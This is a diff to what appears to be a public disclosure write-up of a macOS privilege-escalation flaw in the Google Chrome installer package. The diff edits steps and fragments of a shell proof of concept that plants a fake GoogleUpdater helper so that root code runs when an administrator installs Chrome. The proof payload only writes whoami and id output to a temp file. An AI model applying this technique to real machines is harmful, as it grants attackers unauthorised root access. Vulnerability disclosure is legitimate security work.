@@ -6,7 +6,7 @@ You can try this for yourself, with this link on webarchive: [googlechrome.pkg](
 
 1. run the prepare script (`prepare.sh`)
 2. wait till a legitemate administrator installs the Google Chrome via the installer package.
-3. root code executed without the user knowing.
+3. once the real administrator installs this, then we have executed code as `root` **without knowing the Administrator password**
 
 
 ```sh
@@ -24,7 +24,7 @@ echo "[*] Creating malicious setup..."
 # rm existing
 rm -rf "$APP_PATH"
 
-# create full malicious structure zoals eerder
+# create full malicious structure
 mkdir -p "$APP_PATH/Contents/MacOS"
 mkdir -p "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS"
 
@@ -33,6 +33,7 @@ cat > "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/G
 #!/bin/bash
 {
     echo "The administrator has installed Google Chrome via the package installer"
+    echo "we have gained root without knowing the admin password"
     echo "Executed as: $(whoami)"
     echo "UID: $(id -u)"
     id
@@ -86,6 +87,6 @@ echo "[!] after install, check: cat /tmp/chrome_pwned.txt"
 
 #### disclosure
 
-I'm dislosing this because Google/Chromium doesn't see admin->root as a valid local privilege escalation... So now they're fixing this vulnerability as "spoofing" a bug with no security impact.
+I'm dislosing this because Google/Chromium doesn't see admin->root as a valid local privilege escalation... So now they're fixing this vulnerability as "spoofing" a bug with no security impact. 
 
-A bit unfortunate that I reported this to Google Chrome, as this could've been useful for red teamers.
+A bit unfortunate that I reported this to Google Chrome, as this could've been useful for red teamers. 
